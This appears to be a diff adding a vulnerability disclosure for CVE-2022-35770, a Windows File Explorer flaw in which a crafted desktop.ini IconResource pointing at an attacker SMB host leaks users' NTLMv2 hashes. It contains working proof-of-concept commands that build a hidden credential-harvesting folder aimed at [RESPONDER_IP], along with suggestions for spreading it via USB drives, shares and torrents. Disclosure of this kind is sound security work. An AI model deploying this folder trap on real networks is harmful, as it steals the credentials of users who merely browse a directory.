@@ -1,0 +1,92 @@
+Microsoft Windows File Explorer 'IconResource' Information Disclosure CVE-2022-35770
+
+<br>
+
+**Affected Platforms: -**
+Microsoft Windows ≤11 supporting SMB shares
+
+<br>
+
+**Tested On: -**
+Windows 10, 11 (build 17763.253, build 22000.675)
+
+<br>
+
+**Base: -**
+
+<br>
+
+**Summary: -**
+This vulnerability occurs while fetching icons defined by 'IconResource', written to 'desktop.ini' files.
+
+<br>
+
+**Short Description: -**
+The intended use of the 'IconResource' variable is to replace default folder icons with custom remotely available icons when an end user access the parent directory, unfortunately a simple icon request is enough to disclose the NTLMv2 hash of the current user, without the end user accessing the directory. With the given credentials it is feesable to elevate permissions.
+
+<br>
+
+**Long Description: -**
+A major issue is that directory attributes are stored between devices and accepted between devices, this allows hidden files to remain hidden between Windows machines, therefore system attributes remain amplifying the severity of this vulnerability.
+
+Individuals with write permissions to an existing SMB share, can craft auto-executing credential disclosure folders affecting everyone within the network, undetectable by antivirus and firewall. This same scenario applies to rouge SMB shares within the network.
+
+System configuration files interpret the 'IconResource' variable to remotely fetch the folder icon for folder 'secrets', located within the 'Documents' directory.
+Due to the feature of remotely loading icons, this request is able to be poisoned through Responder, leaking the NTLMv2 encrypted credential pair of the user logged into the current session.
+
+This exploit is a significant security risk to every Microsoft Windows device connected to a LAN, as there is no publicly known method of preventing the credential disclosure.
+The exploit can be shared via removable USB drives, pasted into frequently accessed directories locally, directory traversal when paired with unzip vulnerabilities, downloaded torrents, zip files shared within a network, shared network drives, start-up locations etc.
+
+The primary issue is that file attributes are stored for all users and between all Microsoft Windows devices, reproducible on every machine.
+Entering the folder is not required to trigger the exploit, simply landing in the parent directory is enough to trigger.
+
+<br>
+
+**Proof of Concept: -**
+
+=====
+Step 1.) Execute the following in a Command Prompt/Powershell terminal - or download the batch script here to generate the "Fghost" exploit.
+
+    mkdir secrets
+
+    cd secrets
+
+    echo [.ShellClassInfo] > desktop.ini
+
+    echo IconResource=\\[RESPONDER_IP]\ >> desktop.ini
+
+    attrib +s +h desktop.ini
+
+    cd ..
+
+    attrib +s secrets
+
+Step 2.) Setup Responder to detect connections.
+
+Step 3.) Distrubute payload.
+
+Step 4.) Navigate to parent directory of exploit.
+
+[CREDENTIAL DISCLOSURE SUCCESSFUL]
+
+
+
+VIDEO: -   https://youtu.be/b0FMKmeacI0
+
+<br>
+
+**Expected Result: -**
+User enters directory, folder icon fails to load. Thus does not reconnect to file share where icon is stored.
+
+<br>
+
+**Observed Result: -**
+User enters directory, folder icon fails to load. File explorer broadcasts requests for the icon throughout the network. Disclosing credentials due to rouge SMB share.
+
+<br>
+
+**Recommendation: -**
+Block broadcast requests when failing to connect to remote resources.
+Block remote icons.
+
+**TIMELINE: -** Discovery | 19th Dec 2019
